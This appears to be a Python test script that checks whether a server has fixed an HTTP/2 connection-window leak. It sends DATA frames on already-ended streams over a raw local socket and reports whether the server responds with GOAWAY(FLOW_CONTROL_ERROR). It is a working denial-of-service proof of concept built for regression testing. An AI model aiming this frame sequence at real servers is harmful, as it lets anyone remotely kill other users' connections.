#!/usr/bin/env python3
"""Verifies the server-side h2 connection-window leak in on_data().

Attack shape (RFC 9113): the peer ends a stream (HEADERS+END_STREAM), then
keeps sending DATA on that ended stream. That is a STREAM_CLOSED stream error —
the connector must RST the stream AND return the frame's connection-window
debit (the bytes are not delivered to anyone). If the window is debited but
never returned, enough such frames drag the connection window below zero and
the server answers *legitimate* traffic with GOAWAY(FLOW_CONTROL_ERROR) — a
remote way to kill a connection.

The client here is a raw socket + hyperframe/hpack (no H2Connection state
machine, which would refuse to emit the illegal frames):

  usage: h2_window_leak.py <port> [n_streams] [frame_len]

Attack shape: for each of N streams, end it (HEADERS+END_STREAM) and then send
one DATA frame *on the ended stream*. That DATA is a STREAM_CLOSED stream
error: the server must RST the stream and return that frame's connection-window
debit. If the debit is not returned (stream erased with zero credit), each
stream leaks one frame_len of connection window — with default settings,
4 such frames (16384 B each) exhaust the 65535-octet window and the server
kills every legitimate stream on the connection with GOAWAY(FLOW_CONTROL_ERROR).
"""
import socket
import struct
import sys

from hpack import Encoder
from hyperframe.frame import DataFrame, HeadersFrame, SettingsFrame

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FLOW_CONTROL_ERROR = 3
STREAM_CLOSED = 5


def read_all_frames(sock, timeout=5.0):
    """Reads frames until the peer closes or `timeout` passes. Returns [(type, flags, stream_id, payload)]."""
    sock.settimeout(timeout)
    buf = b""
    out = []
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf += chunk
            while len(buf) >= 9:
                length = int.from_bytes(buf[0:3], "big")
                ftype = buf[3]
                flags = buf[4]
                stream_id = int.from_bytes(buf[5:9], "big") & 0x7FFFFFFF
                if len(buf) < 9 + length:
                    break
                payload = buf[9 : 9 + length]
                out.append((ftype, flags, stream_id, payload))
                buf = buf[9 + length :]
    except socket.timeout:
        pass
    return out


def main():
    port = int(sys.argv[1])
    n_streams = int(sys.argv[2]) if len(sys.argv) > 2 else 8
    frame_len = int(sys.argv[3]) if len(sys.argv) > 3 else 16384

    sock = socket.create_connection(("127.0.0.1", port), timeout=5)
    sock.sendall(PREFACE)
    sock.sendall(SettingsFrame().serialize())

    # Server SETTINGS arrives; acknowledge it (not strictly required, but polite).
    for ftype, flags, sid, payload in read_all_frames(sock, timeout=2.0):
        if ftype == 0x04 and not (flags & 1):  # SETTINGS without ACK
            ack = SettingsFrame()
            ack.flags.add("ACK")
            sock.sendall(ack.serialize())
    sock.settimeout(5)

    enc = Encoder()
    block = enc.encode(
        [(":method", "GET"), (":scheme", "http"), (":authority", f"127.0.0.1:{port}"), (":path", "/world")]
    )

    # The attack: N streams, each ended and then given one DATA on the ended stream.
    sent = 0
    for i in range(n_streams):
        sid = 1 + 2 * i
        hf = HeadersFrame(stream_id=sid)
        hf.data = block
        hf.flags.add("END_HEADERS")
        hf.flags.add("END_STREAM")
        sock.sendall(hf.serialize())
        df = DataFrame(stream_id=sid)
        df.data = b"x" * frame_len
        sock.sendall(df.serialize())
        sent += 1

    frames = read_all_frames(sock, timeout=4.0)

    goaway = [f for f in frames if f[0] == 0x07]
    rst = [f for f in frames if f[0] == 0x03]
    print(f"sent DATA on {sent} ended streams (len {frame_len} each)")
    for ftype, flags, sid, payload in frames:
        name = {0: "DATA", 1: "HEADERS", 3: "RST_STREAM", 4: "SETTINGS", 7: "GOAWAY", 8: "WINDOW_UPDATE"}.get(
            ftype, f"type{ftype}"
        )
        extra = ""
        if ftype == 0x07 and len(payload) >= 8:
            last = int.from_bytes(payload[0:4], "big") & 0x7FFFFFFF
            err = int.from_bytes(payload[4:8], "big")
            extra = f" (last_stream={last} error={err})"
        elif ftype == 0x03 and len(payload) >= 4:
            extra = f" (error={int.from_bytes(payload[0:4], 'big')})"
        print(f"  RX {name} stream={sid} len={len(payload)}{extra}")

    # After the attack, a fresh stream must still get served (connection alive).
    probe_sid = 1 + 2 * n_streams + 2
    hf3 = HeadersFrame(stream_id=probe_sid)
    hf3.data = block
    hf3.flags.add("END_HEADERS")
    hf3.flags.add("END_STREAM")
    sock.sendall(hf3.serialize())
    frames3 = read_all_frames(sock, timeout=4.0)
    head3 = [f for f in frames3 if f[0] == 0x01]
    print(f"probe stream {probe_sid}: {len(head3)} HEADERS frame(s) back => "
          f"{'connection alive' if head3 else 'DEAD'}")

    sock.close()

    flow = [g for g in goaway if len(g[3]) >= 8 and int.from_bytes(g[3][4:8], "big") == FLOW_CONTROL_ERROR]
    if flow:
        print(f"VERDICT: BUG REPRODUCED — {len(flow)} GOAWAY(FLOW_CONTROL_ERROR) from the server")
        return 1
    if goaway:
        print("VERDICT: server sent GOAWAY (not flow-control) — inspect")
        return 1
    print("VERDICT: no GOAWAY; the leak is fixed (window returned on ended streams)")
    return 0


if __name__ == "__main__":
    sys.exit(main())